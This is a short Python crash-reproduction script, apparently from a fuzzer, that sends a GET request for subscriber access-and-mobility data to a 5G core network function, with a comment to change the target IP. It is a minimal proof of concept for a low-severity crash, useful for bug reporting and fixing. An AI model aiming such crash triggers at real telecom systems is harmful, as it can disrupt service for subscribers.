#!/usr/bin/env python3
# Crash reproduction for nrf (low)
# Detected: Sat May  9 02:59:51 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'GET'
path = '/nudr-dr/v1/subscription-data/imsi-001010000000001/provisioned-data/am-data'
body = None
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
